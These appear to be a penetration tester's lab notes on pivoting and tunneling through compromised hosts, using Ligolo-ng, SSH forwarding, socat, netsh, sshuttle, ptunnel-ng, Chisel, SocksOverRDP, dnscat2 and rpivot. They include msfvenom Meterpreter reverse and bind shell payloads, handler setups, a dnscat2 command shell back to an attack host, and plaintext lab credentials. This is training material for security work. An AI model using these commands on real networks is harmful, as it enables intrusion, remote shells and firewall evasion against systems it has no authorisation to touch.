# Ligolo-ng

## Download Proxy and Agent

https://github.com/nicocha30/ligolo-ng/releases

## Setting Up

@attacker

```bash
sudo ligolo-ng -selfcert
```

@pivot

```bash
 ./agent -connect 10.10.16.50:11601 --ignore-cert
```


@attacker

```bash
ligolo-ng » session_list
┌─────────────────────────────────────────────────────────────────────────────┐
│ Active sessions and tunnels                                                 │
├───┬────────────────────────────────────────────────────┬───────────┬────────┤
│ # │ AGENT                                              │ INTERFACE │ STATUS │
├───┼────────────────────────────────────────────────────┼───────────┼────────┤
│ 1 │ jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370 │           │ Online │
└───┴────────────────────────────────────────────────────┴───────────┴────────┘

ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.198.169:39368 - 0050568a2370
[Agent : jbetty@DMZ01] »
```

Once the session is specified, use the `autoroute` command on the `ligolo-ng` terminal and select the route, create new interface, and start the tunnel.

```bash
[Agent : jbetty@DMZ01] » autoroute
? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0329] Generating a random interface name...
INFO[0329] Using interface name closeelectra
INFO[0329] Creating routes for closeelectra...
? Start the tunnel? Yes
INFO[0358] Starting tunnel to jbetty@DMZ01 (0050568a2370)
```

# Dynamic Port Forwarding with SSH

![](Pasted%20image%2020260109194349.png)

In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on `localhost:9050`.

## Enabling Dynamic Port Forwarding with SSH

```bash
$ ssh -D 9050 ubuntu@10.129.202.64
```

## /etc/proxychains.conf

```bash
$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

## Proxychainings

```bash
proxychains -q nmap -p3389 172.16.5.19
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 19:41 +0700
Nmap scan report for 172.16.5.19
Host is up (0.00s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

```bash
$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Remote/Reverse Port Forwarding with SSH

![](Pasted%20image%2020260111145954.png)

To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS (or other) payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port `8080` on the Ubuntu server to forward all of our reverse packets to our attack hosts' `8000` port, where our Metasploit listener is running.

## msfvenom

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

## Meterpreter multi/handler

```bash
use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run
```

## Reverse Port Forwarding

```bash
$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```


# Socat Redirection with a Revershe Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling.

## Socat Redirector

Example :

```bash
$ socat TCP4-LISTEN:8080,fork TCP4:10.10.16.50:4444
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our `attack host` (10.10.14.18).

## Windows Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=8080 -f exe -o rev.exe
```

## Meterpreter Multi/handler

```bash
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf exploit(multi/handler) > set lhost tun0
lhost => 10.10.16.50
```

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
# Socat Redirection with a Bind Shell

![](images/Pasted%20image%2020260103110729.png)

## Create Listener Windows Payload (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o listener.exe LPORT=8443
```

## Create Socat Redirection on Pivot Host

```bash
ubuntu@WEB01:~$ sudo socat TCP-LISTEN:8000,fork TCP4:172.16.5.19:8443
```

## Start Meterpreter to connect to windows listener

```bash
msf exploit(multi/handler) > options

Payload options (aa

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '
                                        ', seh, thread, process, no
                                        ne)
   LPORT     8000             yes       The listen port
   RHOST     10.129.202.64    no        The target address

msf exploit(multi/handler) > run
[*] Started bind TCP handler against 10.129.202.64:8000
[*] Sending stage (230982 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.16.50:38369 -> 10.129.202.64:8000) at 2026-01-03 11:07:01 +0700

meterpreter > sysinfo
```

# Port Forwarding with Netsh (Windows)

[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

- `Finding routes`
- `Viewing the firewall configuration`
- `Adding proxies`
- `Creating port forwarding rules`

![](images/Pasted%20image%2020260105144108.png)

We can use `netsh.exe` to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.

```powershell
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

```powershell
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

After configuring the `portproxy` on our Windows-based pivot host, we will try to connect to the `8080` port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by `netsh.exe`.

# SSH Pivoting with Sshuttle

To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.

```bash
$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

Starting sshuttle proxy (version 1.1.0).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/loca
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

# ICMP Tunneling with SOCKS

## Start ptunnel-ng Server on target

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

 -r --remote-addr
        Set remote proxy destination address if client
        Restrict to only this destination address if server
            (default: 127.0.0.1)
-R --remote-port
        Set remote proxy destination port if client
        Restrict to only this destination port if server
            (default: 22)


## Connecting to ptunnel-ng Server from Attack Host

```bash
sudo ./src/ptunnel-ng -p10.129.101.17 -l2222 -r10.129.101.17 -R22
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

-l --listen
        Set TCP listening port (only used when operating in forward mode)
            (default: 2222)
-p --proxy
        Set address of peer running packet forwarder. This causes
        ptunnel to operate in forwarding mode (Client) - the absence of this
        option causes ptunnel to operate in proxy mode (Server).

## Tunneling an SSH connection through an ICMP Tunnel

```bash
$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

```bash
$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

# SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

## Running the Chisel Server on the Pivot Host

@pivot-host
```bash
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

## Connecting to the Chisel Server

@attack-box
```bash
akhmadkun@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

## proxychains.conf

```bash
❯ tail -f /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"

#socks4 	127.0.0.1 9050
#socks4 	127.0.0.1 9060

socks5 127.0.0.1 1080
```


## Chisel Reverse Pivot

Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed.

@attack-box
```bash
akhmadkun@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

@pivot-host
```bash
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

# SocksOverRDP

We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
    
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
    
	We can look for `ProxifierPE.zip`

Connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using `regsvr32.exe`.

@windows-attack-box
```powershell
C:\> regsvr32.exe SocksOverRDP-Plugin.dll
```

Connect to target machine over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on `127.0.0.1:1080`.

![](Pasted%20image%2020260110173309.png)

We will need to transfer `SocksOverRDPx64.zip` or just the `SocksOverRDP-Server.exe` to target. We can then start SocksOverRDP-Server.exe with `Admin` privileges.

When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on `127.0.0.1:1080`.

```powershell
C:\> netstat -antb | findstr 1080

  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

Configure `Proxifier` to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. 


# DNS Tunneling with DNScat2

## Server on Attack Box

```bash
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

```

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

## Client on Target Host

```bash
$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1

PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```


## Confirming Session Establishment

```bash
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>

dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

## Server @attack-box

```bash
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

## Client @target-box

```bash
$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

## Confirming Connection is Established

```shell-session
New connection from host 10.129.202.64, source port 35226
```

We will configure `proxychains` to pivot over our local server on `127.0.0.1:9050` on our attack host, which was initially started by the Python server.